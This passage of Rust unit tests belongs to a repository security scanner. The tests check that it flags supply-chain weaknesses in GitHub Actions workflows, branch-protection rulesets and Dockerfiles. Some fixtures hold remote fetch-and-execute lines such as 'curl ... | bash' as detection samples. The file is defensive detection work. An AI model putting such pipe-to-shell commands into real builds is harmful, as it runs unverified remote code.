            "name: release\non:\n  push:\n    tags: ['v*']\npermissions:\n  id-token: write\njobs:\n  release:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm publish --provenance\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().all(|finding| {
            finding.id != "config.github-actions.publish-without-provenance"
        }));
        assert!(findings.iter().all(|finding| {
            finding.id != "config.github-actions.trusted-publishing-permissions"
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_trusted_publishing_without_id_token_permission() {
        let (context, root) = test_context(&[(
            ".github/workflows/publish.yml",
            "name: publish\non:\n  push:\n    tags: ['v*']\npermissions:\n  contents: read\njobs:\n  release:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: pypa/gh-action-pypi-publish@release/v1\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("trusted publishing flow lacks id-token permission")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_oci_publish_workflows_without_provenance() {
        let (context, root) = test_context(&[(
            ".github/workflows/container.yml",
            "name: container\non:\n  push:\n    tags: ['v*']\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: docker/setup-buildx-action@v3\n      - uses: docker/build-push-action@v6\n        with:\n          push: true\n          tags: ghcr.io/acme/demo:v1\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("OCI publish workflow lacks explicit provenance or signing signals")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_oci_publish_workflows_using_long_lived_registry_credentials() {
        let (context, root) = test_context(&[(
            ".github/workflows/container.yml",
            "name: container\non:\n  push:\n    tags: ['v*']\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: docker/login-action@v3\n        with:\n          username: ${{ github.actor }}\n          password: ${{ secrets.GHCR_TOKEN }}\n      - uses: docker/build-push-action@v6\n        with:\n          push: true\n          provenance: true\n          tags: ghcr.io/acme/demo:v1\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("OCI publish workflow relies on long-lived registry credentials")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_oci_publish_workflows_without_secret_backed_registry_credentials() {
        let (context, root) = test_context(&[(
            ".github/workflows/container.yml",
            "name: container\non:\n  push:\n    tags: ['v*']\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: docker/login-action@v3\n        with:\n          username: ${{ github.actor }}\n          password: ${{ github.token }}\n      - uses: docker/build-push-action@v6\n        with:\n          push: true\n          provenance: true\n          tags: ghcr.io/acme/demo:v1\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().all(|finding| {
            finding.id != "config.github-actions.oci-long-lived-registry-credential"
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_keyless_signing_without_id_token_permission() {
        let (context, root) = test_context(&[(
            ".github/workflows/sign.yml",
            "name: sign\non:\n  push:\n    tags: ['v*']\npermissions:\n  contents: read\njobs:\n  sign:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cosign sign --keyless ghcr.io/acme/demo:v1\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("keyless signing flow lacks id-token permission")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_signing_workflows_using_long_lived_signing_credentials() {
        let (context, root) = test_context(&[(
            ".github/workflows/sign.yml",
            "name: sign\non:\n  push:\n    tags: ['v*']\njobs:\n  sign:\n    runs-on: ubuntu-latest\n    env:\n      COSIGN_PRIVATE_KEY: ${{ secrets.COSIGN_PRIVATE_KEY }}\n      COSIGN_PASSWORD: ${{ secrets.COSIGN_PASSWORD }}\n    steps:\n      - run: cosign sign --key env://COSIGN_PRIVATE_KEY ghcr.io/acme/demo:v1\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("signing workflow relies on long-lived signing credentials")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_signing_workflows_without_long_lived_signing_credentials() {
        let (context, root) = test_context(&[(
            ".github/workflows/sign.yml",
            "name: sign\non:\n  push:\n    tags: ['v*']\npermissions:\n  id-token: write\njobs:\n  sign:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cosign sign --keyless ghcr.io/acme/demo:v1\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().all(|finding| {
            finding.id != "config.github-actions.signing-long-lived-credential"
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_keyless_signing_with_id_token_permission() {
        let (context, root) = test_context(&[(
            ".github/workflows/sign.yml",
            "name: sign\non:\n  push:\n    tags: ['v*']\npermissions:\n  id-token: write\njobs:\n  sign:\n    runs-on: ubuntu-latest\n    steps:\n      - run: cosign sign --keyless ghcr.io/acme/demo:v1\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().all(|finding| {
            finding.id != "config.github-actions.keyless-signing-permissions"
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_oci_publish_workflows_with_buildx_provenance() {
        let (context, root) = test_context(&[(
            ".github/workflows/container.yml",
            "name: container\non:\n  push:\n    tags: ['v*']\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: docker/setup-buildx-action@v3\n      - uses: docker/build-push-action@v6\n        with:\n          push: true\n          provenance: true\n          tags: ghcr.io/acme/demo:v1\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().all(|finding| {
            finding.id != "config.github-actions.oci-publish-without-provenance"
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_publish_workflows_without_long_lived_registry_secrets() {
        let (context, root) = test_context(&[(
            ".github/workflows/release.yml",
            "name: release\non:\n  push:\n    tags: ['v*']\npermissions:\n  id-token: write\n  attestations: write\njobs:\n  release:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/attest-build-provenance@v2\n      - run: npm publish --provenance\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().all(|finding| {
            finding.id != "config.github-actions.publish-long-lived-credential"
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_tag_release_workflows_that_checkout_mutable_branch_refs() {
        let (context, root) = test_context(&[(
            ".github/workflows/release.yml",
            "name: release\non:\n  push:\n    tags: ['v*']\npermissions:\n  id-token: write\n  attestations: write\njobs:\n  release:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: main\n      - uses: actions/attest-build-provenance@v2\n      - run: npm publish\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("Tag or release workflow checks out a mutable branch ref")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_branch_workflows_that_mint_and_push_tags() {
        let (context, root) = test_context(&[(
            ".github/workflows/promote.yml",
            "name: promote\non:\n  push:\n    branches: [main]\njobs:\n  release:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: git tag v1.2.3 && git push origin --tags\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("branch workflow creates and pushes Git tags")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_github_settings_that_weaken_branch_review_posture() {
        let (context, root) = test_context(&[(
            ".github/settings.yml",
            "branches:\n  - name: main\n    protection:\n      enforce_admins: false\n      required_pull_request_reviews:\n        required_approving_review_count: 0\n        dismiss_stale_reviews: false\n        require_code_owner_reviews: false\n      required_signatures: false\n      required_linear_history: false\n      required_conversation_resolution: false\n      required_status_checks: null\n      allow_force_pushes: true\n      allow_deletions: true\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("GitHub repository governance allows force pushes")
        }));
        assert!(findings
            .iter()
            .any(|finding| { finding.title.contains("allows branch or tag deletions") }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("does not enforce rules for administrators")
        }));
        assert!(findings
            .iter()
            .any(|finding| { finding.title.contains("requires zero approving reviews") }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("disables required code-owner review")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("keeps stale approvals after new commits")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("disables required signed commits")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("disables required linear history")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("disables required conversation resolution")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("disables required status checks")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_rulesets_with_bypass_and_non_active_enforcement() {
        let (context, root) = test_context(&[(
            ".github/rulesets/main.yml",
            "name: main-branch\nenforcement: evaluate\nbypass_actors:\n  - actor_id: 1\nrules:\n  - type: pull_request\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("GitHub ruleset is not enforced in active mode")
        }));
        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("declares explicit bypass actors or allowances")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_rulesets_that_disable_non_fast_forward_protection() {
        let (context, root) = test_context(&[(
            ".github/rulesets/release.json",
            "{\n  \"name\": \"release-tags\",\n  \"enforcement\": \"active\",\n  \"rules\": [\n    {\n      \"type\": \"non_fast_forward\",\n      \"parameters\": {\n        \"enabled\": false\n      }\n    }\n  ]\n}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("disable non-fast-forward protection")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_rulesets_that_disable_required_signed_commits() {
        let (context, root) = test_context(&[(
            ".github/rulesets/release.json",
            "{\n  \"name\": \"release-tags\",\n  \"enforcement\": \"active\",\n  \"rules\": [\n    {\n      \"type\": \"required_signatures\",\n      \"parameters\": {\n        \"enabled\": false\n      }\n    }\n  ]\n}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("disable required signed commits")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_rulesets_that_disable_required_linear_history() {
        let (context, root) = test_context(&[(
            ".github/rulesets/release.json",
            "{\n  \"name\": \"release-tags\",\n  \"enforcement\": \"active\",\n  \"rules\": [\n    {\n      \"type\": \"required_linear_history\",\n      \"parameters\": {\n        \"enabled\": false\n      }\n    }\n  ]\n}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("disable required linear history")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_rulesets_that_disable_required_conversation_resolution() {
        let (context, root) = test_context(&[(
            ".github/rulesets/release.json",
            "{\n  \"name\": \"release-tags\",\n  \"enforcement\": \"active\",\n  \"rules\": [\n    {\n      \"type\": \"required_conversation_resolution\",\n      \"parameters\": {\n        \"enabled\": false\n      }\n    }\n  ]\n}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("disable required conversation resolution")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_rulesets_that_disable_required_status_checks() {
        let (context, root) = test_context(&[(
            ".github/rulesets/release.json",
            "{\n  \"name\": \"release-tags\",\n  \"enforcement\": \"active\",\n  \"rules\": [\n    {\n      \"type\": \"required_status_checks\",\n      \"parameters\": {\n        \"enabled\": false\n      }\n    }\n  ]\n}\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("disable required status checks")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_active_repo_governance_with_basic_review_controls() {
        let (context, root) = test_context(&[
            (
                ".github/settings.yml",
                "branches:\n  - name: main\n    protection:\n      enforce_admins: true\n      required_pull_request_reviews:\n        required_approving_review_count: 2\n        dismiss_stale_reviews: true\n        require_code_owner_reviews: true\n      required_signatures: true\n      required_linear_history: true\n      required_conversation_resolution: true\n      required_status_checks:\n        strict: true\n        contexts:\n          - ci/test\n      allow_force_pushes: false\n      allow_deletions: false\n",
            ),
            (
                ".github/rulesets/main.yml",
                "name: main-branch\nenforcement: active\nrules:\n  - type: pull_request\n  - type: required_signatures\n    parameters:\n      enabled: true\n  - type: required_linear_history\n    parameters:\n      enabled: true\n  - type: required_conversation_resolution\n    parameters:\n      enabled: true\n  - type: required_status_checks\n    parameters:\n      enabled: true\n",
            ),
        ]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| !finding.id.starts_with("config.github-governance.")),
            "expected no github-governance findings, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_pull_request_target_checkout_without_disabling_credentials() {
        let (context, root) = test_context(&[(
            ".github/workflows/pr-target-checkout.yml",
            "name: pr-target\non:\n  pull_request_target:\n    types: [opened]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: echo reviewing\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings.iter().any(|finding| {
            finding
                .title
                .contains("checks out code without disabling persisted credentials")
        }));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_unpinned_dockerfile_base_images() {
        let (context, root) = test_context(&[(
            "Dockerfile",
            "FROM node:20-alpine AS build\nRUN npm ci\nFROM gcr.io/distroless/nodejs20\nCOPY --from=build /app /app\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| finding.title.contains("Dockerfile base image")));
        assert_eq!(
            findings
                .iter()
                .filter(|finding| finding.title.contains("Dockerfile base image"))
                .count(),
            2
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_digest_pinned_and_stage_local_dockerfile_images() {
        let (context, root) = test_context(&[(
            "Dockerfile",
            "FROM node:20-alpine@sha256:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef AS build\nRUN npm ci\nFROM build AS runtime\nCOPY --from=build /app /app\nFROM alpine@sha256:abcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcd\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| !finding.title.contains("Dockerfile base image")),
            "expected no Docker base-image findings, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_explicit_root_user_in_final_docker_stage() {
        let (context, root) = test_context(&[(
            "Dockerfile",
            "FROM node:20-alpine AS build\nRUN npm ci\nUSER root\nFROM gcr.io/distroless/nodejs20:debug\nCOPY --from=build /app /app\nUSER 0:0\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| finding.id == "config.dockerfile.final-stage-root-user"));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_non_root_final_user_even_if_build_stage_uses_root() {
        let (context, root) = test_context(&[(
            "Dockerfile",
            "FROM node:20-alpine AS build\nUSER root\nRUN npm ci\nFROM node:20-alpine\nRUN adduser -D app\nUSER app\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| finding.id != "config.dockerfile.final-stage-root-user"),
            "expected no final-stage root-user finding, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_dockerfile_remote_installer_pipes() {
        let (context, root) = test_context(&[(
            "Dockerfile",
            "FROM alpine:3.20\nRUN curl -fsSL https://example.com/install.sh | bash\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| finding.id == "config.dockerfile.remote-pipe-installer"));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_remote_downloads_that_pipe_into_non_shell_tools() {
        let (context, root) = test_context(&[(
            "Dockerfile",
            "FROM alpine:3.20\nRUN curl -fsSL https://example.com/tool.tar.gz | tar -xz -C /usr/local/bin\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| finding.id != "config.dockerfile.remote-pipe-installer"),
            "expected no remote-pipe installer finding, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_dockerfile_remote_download_then_executes_payload() {
        let (context, root) = test_context(&[(
            "Dockerfile",
            "FROM alpine:3.20\nRUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh && sh /tmp/install.sh\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| finding.id == "config.dockerfile.remote-download-execution"));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn ignores_dockerfile_remote_download_without_execution() {
        let (context, root) = test_context(&[(
            "Dockerfile",
            "FROM alpine:3.20\nRUN wget https://example.com/tool.tar.gz -O /tmp/tool.tar.gz && tar -xzf /tmp/tool.tar.gz -C /opt/tool\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(
            findings
                .iter()
                .all(|finding| finding.id != "config.dockerfile.remote-download-execution"),
            "expected no remote-download execution finding, got: {findings:#?}"
        );
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    #[test]
    fn detects_dockerfile_remote_add_sources() {
        let (context, root) = test_context(&[(
            "Dockerfile",
            "FROM alpine:3.20\nADD https://example.com/release/app.tar.gz /tmp/app.tar.gz\n",
        )]);

        let findings = ConfigScanner.scan(&context).expect("scan should succeed");

        assert!(findings
            .iter()
            .any(|finding| finding.id == "config.dockerfile.remote-add-source"));
        fs::remove_dir_all(root).expect("temp directory cleanup should succeed");
    }

    fn test_context(files: &[(&str, &str)]) -> (ExecutionContext, PathBuf) {
        let root = std::env::temp_dir().join(format!(
            "wolfence-scanner-test-{}-{}",
            std::process::id(),
            TEST_COUNTER.fetch_add(1, Ordering::Relaxed)
        ));

        fs::create_dir_all(&root).expect("temp root should be created");
        let mut candidate_files = Vec::new();

        for (relative_path, contents) in files {
            let full_path = root.join(relative_path);
            if let Some(parent) = full_path.parent() {
                fs::create_dir_all(parent).expect("temp file parent should exist");
            }
            fs::write(&full_path, contents).expect("temp file should be written");
            candidate_files.push(PathBuf::from(relative_path));
        }

        let context = ExecutionContext {
            action: ProtectedAction::Scan,
            repo_root: root.clone(),
            discovered_candidate_files: candidate_files.len(),
            candidate_files,
            ignored_candidate_files: Vec::new(),
            config: ResolvedConfig {
                mode: EnforcementMode::Standard,
                mode_source: ConfigSource::Default,
                repo_config_path: root.join(".wolfence/config.toml"),
                repo_config_exists: false,
                scan_ignore_paths: Vec::new(),
                node_internal_packages: Vec::new(),
                node_internal_package_prefixes: Vec::new(),
                node_registry_ownership: Vec::new(),
                ruby_source_ownership: Vec::new(),
                python_internal_packages: Vec::new(),
                python_internal_package_prefixes: Vec::new(),
                python_index_ownership: Vec::new(),
            },
            receipts: ReceiptIndex::default(),
            push_status: None,
        };

        (context, root)
    }

    fn test_context_bytes(files: &[(&str, &[u8])]) -> (ExecutionContext, PathBuf) {
        let root = std::env::temp_dir().join(format!(
            "wolfence-scanner-test-{}-{}",
            std::process::id(),
            TEST_COUNTER.fetch_add(1, Ordering::Relaxed)
        ));

        fs::create_dir_all(&root).expect("temp root should be created");
        let mut candidate_files = Vec::new();

        for (relative_path, contents) in files {
            let full_path = root.join(relative_path);
            if let Some(parent) = full_path.parent() {
                fs::create_dir_all(parent).expect("temp file parent should exist");
            }
            fs::write(&full_path, contents).expect("temp file should be written");
            candidate_files.push(PathBuf::from(relative_path));
        }

        let context = ExecutionContext {
            action: ProtectedAction::Scan,
            repo_root: root.clone(),
            discovered_candidate_files: candidate_files.len(),
            candidate_files,
            ignored_candidate_files: Vec::new(),
            config: ResolvedConfig {
                mode: EnforcementMode::Standard,
                mode_source: ConfigSource::Default,
                repo_config_path: root.join(".wolfence/config.toml"),
                repo_config_exists: false,
                scan_ignore_paths: Vec::new(),
                node_internal_packages: Vec::new(),
                node_internal_package_prefixes: Vec::new(),
                node_registry_ownership: Vec::new(),
                ruby_source_ownership: Vec::new(),
                python_internal_packages: Vec::new(),
                python_internal_package_prefixes: Vec::new(),
                python_index_ownership: Vec::new(),
            },
            receipts: ReceiptIndex::default(),
            push_status: None,
        };

        (context, root)
    }

    fn initialize_git_repo(repo_root: &Path) {
        let output = Command::new("git")
            .arg("-C")
            .arg(repo_root)
            .args(["init", "-b", "main"])
            .output()
            .expect("git init should spawn");
        assert!(
            output.status.success(),
            "git init failed: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    }

    fn run_git(repo_root: &Path, args: &[&str]) {
        let output = Command::new("git")
            .arg("-C")
            .arg(repo_root)
            .args(args)
            .output()
            .expect("git command should spawn");
        assert!(
            output.status.success(),
            "git {:?} failed: {}",
            args,
            String::from_utf8_lossy(&output.stderr)
        );
    }

    fn zip_style_archive_fixture(entries: &[&str]) -> Vec<u8> {
        let mut bytes = Vec::new();

        for entry in entries {
            bytes.extend_from_slice(b"PK\x01\x02");
            bytes.extend_from_slice(&[0u8; 24]);
            bytes.extend_from_slice(&(entry.len() as u16).to_le_bytes());
            bytes.extend_from_slice(&[0u8; 16]);
            bytes.extend_from_slice(entry.as_bytes());
        }

        bytes
    }
}
